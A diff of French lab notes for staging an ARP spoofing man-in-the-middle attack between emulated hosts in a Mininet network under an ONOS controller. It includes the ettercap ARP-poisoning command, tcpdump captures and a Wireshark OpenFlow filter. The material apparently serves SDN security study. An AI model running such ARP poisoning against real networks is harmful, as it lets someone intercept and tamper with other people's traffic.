@@ -1,10 +1,13 @@
-Prérequis : -installer ettercap sur la machine virtuelle contenant Mininet
-            -ne pas avoir de règles autre que le forward pour les paquets ARP arrivant à ONOS
+Prérequis théorique : -un équipement dans le réseau local
+                      -ne pas avoir de règles autre que le forward pour les paquets ARP arrivant au niveau du contrôleur
+
+Prérequis pratique : -installer ettercap sur la machine virtuelle contenant Mininet
+                     -ne pas avoir de règles autre que le forward pour les paquets ARP arrivant au niveau d'ONOS
 
 
 Depuis mininet :
 
-./general_topology.py
+sudo ./general_topology.py
     h2 ping h11 &
     h11 tcpdump -w dump_victim.pcap -i h11-eth0 &
     h6 ettercap -i h6-eth0 -T -w dump_attacker.pcap -M ARP /10.0.0.2// /10.0.0.11//
@@ -12,7 +15,7 @@ Depuis mininet :
 
 Depuis le contrôleur :
 
-wireshark (filtrer avec "tcp.port == 6633 && openflow_v4", mais préférer observer les fichiers dump_victim.pcap et dump_attacker.pcap)
+wireshark (filtrer avec "tcp.port == 6633 && openflow_v4 && openflow_v4.type == OFPT_PACKET_IN", mais préférer observer les fichiers dump_victim.pcap et dump_attacker.pcap)
 
 
 Attaque :
